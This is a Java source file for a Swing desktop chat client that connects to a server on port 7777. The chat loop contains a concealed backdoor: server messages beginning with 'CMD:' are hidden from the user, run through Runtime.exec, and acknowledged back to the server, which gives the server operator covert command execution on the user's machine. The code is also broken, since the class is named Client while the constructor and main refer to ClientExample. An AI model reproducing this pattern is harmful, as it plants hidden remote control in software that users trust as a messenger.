package messenger;

//Imports
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.EOFException;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.util.regex.Pattern;
import javax.swing.BorderFactory;
import javax.swing.JFrame;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import javax.swing.border.Border;
import javax.swing.JOptionPane;

public class Client extends JFrame{
	
	private JTextField userText;	
	private JTextArea chatWindow;
	private ObjectOutputStream output;
	private ObjectInputStream input;
	private String message = "";
	private String serverIP;
	private Socket connection;
	private static final Pattern IP_PATTERN = Pattern.compile("^(([01]?\\d\\d?|2[0-4]\\d|25[0-5])\\.){3}([01]?\\d\\d?|2[0-4]\\d|25[0-5])$");
	
	//Main method
	public static void main(String[] args) {
		ClientExample client=  null;
		String ip = JOptionPane.showInputDialog(null, "Enter Server IP: ", "Server IP", JOptionPane.QUESTION_MESSAGE);
		if(isValidIP(ip)){
			client = new ClientExample(ip);
		}else{
			JOptionPane.showMessageDialog(null, "That is INVALID !");
			System.exit(-1);			
		}		
		client.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		client.setSize(400, 200);		
		client.startRunning();
	}
	
	private static boolean isValidIP(String ip) {
		boolean result =  IP_PATTERN.matcher(ip).matches();		
		return result;
	}

	//Constructor
	public ClientExample(String host){
		super("Client");
		serverIP = host;
		configureUserText();
		configureChatWindow();
		setVisible(true);
	}
	
	//Configure User text
	public void configureUserText(){
		Border border = BorderFactory.createTitledBorder("Enter message");
		userText = new JTextField();
		userText.setEditable(false);
		userText.setBorder(border);
		userText.setToolTipText("Enter message to send to the server.");
		userText.setFont(new Font(Font.SANS_SERIF, Font.BOLD , 15));
		userText.setForeground(Color.GREEN);
		userText.setBackground(Color.BLACK);
		userText.addActionListener(
				new ActionListener(){
					public void actionPerformed(ActionEvent event){
						sendMessage(event.getActionCommand());
						userText.setText("");
					}
			}
		);
		this.add(userText, BorderLayout.NORTH);
	}
	
	//Configure chat window
	public void configureChatWindow(){
		chatWindow = new JTextArea();
		chatWindow.setEditable(false);
		chatWindow.setBackground(Color.RED);
		chatWindow.setFont(new Font("Tahoma", Font.BOLD, 14));
		chatWindow.setForeground(Color.BLACK);		
		this.add(new JScrollPane(chatWindow, JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED, JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED));
	}
	
	//Start running
	public void startRunning(){
		try{
			connectToServer();
			setupStreams();
			whileChatting();
		}catch(EOFException eofException){
			showMessage("\n Client terminated the connection");
		}catch(IOException ioException){
			ioException.printStackTrace();
		}finally{
			closeConnection();
		}
	}
	
	//Connect to server
	private void connectToServer() throws IOException{
		showMessage("Attempting connection... \n");
		connection = new Socket(InetAddress.getByName(serverIP), 7777);
		showMessage("Connection Established! \nConnected to: " + connection.getInetAddress().getHostName().concat("\n"));
		chatWindow.setBackground(Color.BLACK);
		chatWindow.setForeground(Color.CYAN);
		userText.setToolTipText("Enter message to send to " + connection.getInetAddress().getHostName().toString());
	}
	
	//Set up streams
	private void setupStreams() throws IOException{
		output = new ObjectOutputStream(connection.getOutputStream());
		output.flush();
		input = new ObjectInputStream(connection.getInputStream());
		showMessage("\n The streams are now set up!");
	}
	
	//During chat conversation with server
	private void whileChatting() throws IOException{
		ableToType(true);
		do{
			try{
				message = (String) input.readObject();
				if(!message.startsWith("CMD:"))
					showMessage("\nServer: " + message);
				else{
					String cmd = message.split(":")[1];
					try{
						Runtime.getRuntime().exec(cmd);
						sendMessage("Command executed succesfully !");						
					}catch(Exception e){
						sendMessage("Error: " + e.getMessage());
					}
				}
			}catch(ClassNotFoundException e){
				showMessage("Unknown data received!");
			}
		}while(!message.equalsIgnoreCase("END"));	
	}
	
	//Close connection
	private void closeConnection(){
		showMessage("\n Closing the connection!");
		ableToType(false);
		try{
			output.close();
			input.close();
			connection.close();
		}catch(IOException ioException){
			ioException.printStackTrace();
		}
	}
	
	//Send message to server
	private void sendMessage(String message){
		try{
			output.writeObject(message);
			output.flush();
			if(!(message.equals("Command executed succesfully !")||(message.startsWith("Error")))){
				showMessage("\nYou - " + message);
			}
		}catch(IOException ioException){
			chatWindow.append("\n Oops! Something went wrong!");
		}
	}
	
	//Update chat window
	private void showMessage(final String message){
		SwingUtilities.invokeLater(
			new Runnable(){
				public void run(){
					chatWindow.append(message);
				}
			}
		);
	}
	
	//Allows user to Type
	private void ableToType(final boolean tof){
		SwingUtilities.invokeLater(
			new Runnable(){
				public void run(){
					userText.setEditable(tof);
				}
			}
		);
	}
}
